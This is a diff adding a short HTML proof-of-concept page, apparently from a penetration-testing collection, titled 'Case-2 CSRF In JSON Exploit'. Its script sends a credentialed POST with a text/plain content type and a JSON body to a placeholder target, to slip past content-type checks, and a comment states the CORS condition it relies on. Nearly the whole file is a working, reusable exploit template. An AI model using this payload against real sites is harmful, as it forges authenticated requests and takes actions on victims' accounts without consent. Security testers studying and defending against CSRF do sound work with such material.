@@ -1,0 +1,20 @@
+<!--
+    When Application doesn't check content-type, but check body format
+    Conditions: 
+-> One CORS condition is required to achieve the above case. The ACAO (Access-Control-Allow-Origin) should not be a wildcard value
+-->
+<html> 
+<title>Hacked</title>
+<body>
+    <h1 align="center">Case-2 CSRF In JSON Exploit</h1>
+    <center>   
+        <script>  
+        fetch('http://target.com', {method: 'POST', credentials: 'include', headers: {'Content-Type': 'text/plain'}, body: '{"parameter":"parameter_value"}'});  
+        </script>  
+        <form align="center" action="#">  
+            <input type="button" value="Submit" />  
+        </form> 
+        <p align="center"><b>Share the Exciting Hacking Material of Penetration-List</b></p>
+    </center> 
+</body>
+</html>
